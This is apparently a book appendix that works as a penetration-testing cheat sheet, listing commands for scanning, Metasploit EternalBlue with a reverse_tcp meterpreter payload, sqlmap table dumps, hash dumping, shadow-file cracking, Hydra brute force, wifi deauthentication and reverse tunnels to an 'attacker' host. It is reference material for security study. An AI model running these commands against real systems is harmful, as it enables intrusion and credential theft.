# Appendix G: Security Tools Reference

## Reconnaissance

### nmap
```bash
nmap -sS -sV -O -T4 target        # Stealth scan with version/OS detection
nmap --script vuln target          # Run vulnerability scripts
nmap -sn 192.168.1.0/24           # Ping sweep (host discovery)
```

### theHarvester
```bash
theHarvester -d example.com -b google -l 200
```

### Shodan CLI
```bash
shodan search "apache country:US"
shodan host 1.2.3.4
```

## Vulnerability Scanners

### Nessus / OpenVAS
- Nessus: `https://localhost:8834` after `systemctl start nessusd`
- OpenVAS: `gvm-start` then browse to `https://localhost:9392`

### Nikto (web scanner)
```bash
nikto -h https://target.com
nikto -h https://target.com -ssl
nikto -h target.com -port 8080 -output report.txt
```

### WPScan
```bash
wpscan --url https://target.com
wpscan --url https://target.com --enumerate u,p
```

## Exploitation

### Metasploit Framework
```bash
msfconsole                         # Start console
search ms17-010                    # Search for exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
run
```

### Meterpreter Quick Commands
```
sysinfo          # System information
getuid           # Current user
getsystem        # Attempt privilege escalation
shell            # Drop to system shell
upload / download
hashdump         # Dump password hashes
```

### sqlmap
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --level=5
```

## Password Cracking

### John the Ripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=md5crypt hashes.txt
john --show hashes.txt
unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt
```

### Hashcat
```bash
hashcat -m 0 hash.txt wordlist.txt          # MD5
hashcat -m 1000 hash.txt wordlist.txt       # NTLM
hashcat -m 1800 hash.txt wordlist.txt       # sha512crypt
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a    # Brute force mask
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule
```

### Common Hash Types
| ID | Hash |
|----|------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | sha512crypt |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |

## Brute Force / Fuzzing

### Hydra
```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.100
hydra -l admin -P rockyou.txt ftp://192.168.1.100
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```

### ffuf (web fuzzer)
```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt
ffuf -u https://target.com/login -w wordlist.txt \
  -X POST -d "user=admin&pass=FUZZ" -fc 302
```

### gobuster
```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w subdomains.txt
```

## Network Traffic Analysis

### Wireshark Filters
```
http                           # HTTP traffic
tcp.port == 443                # HTTPS
ip.addr == 192.168.1.1         # Specific IP
http.request.method == "POST"  # POST requests
dns                            # DNS queries
```

### tcpdump
```bash
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap 'port 80'
```

## Wireless

### aircrack-ng suite
```bash
airmon-ng start wlan0            # Enable monitor mode
airodump-ng wlan0mon             # Scan networks
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon   # Deauth
aircrack-ng capture-01.cap -w rockyou.txt
```

## Forensics / Post-Exploitation

### Volatility (Memory Forensics)
```bash
vol.py -f memory.dmp imageinfo
vol.py -f memory.dmp --profile=Win7SP1x64 pslist
vol.py -f memory.dmp --profile=Win7SP1x64 netscan
vol.py -f memory.dmp --profile=Win7SP1x64 hashdump
```

### Autopsy / Sleuth Kit
```bash
fls -r disk.img             # List files recursively
icat disk.img 12345         # Extract file by inode
```

### strings
```bash
strings -n 8 binary | grep -i password
strings malware.exe | grep http
```

## Pivoting / Tunneling

### SSH Tunnels
```bash
ssh -L 3306:db-internal:3306 user@jump-host    # Local forward
ssh -R 8080:localhost:80 user@attacker         # Remote forward
ssh -D 1080 user@jump-host                     # SOCKS proxy
```

### chisel
```bash
# Server (attacker)
chisel server -p 8000 --reverse
# Client (victim)
chisel client attacker:8000 R:9000:127.0.0.1:3306
```
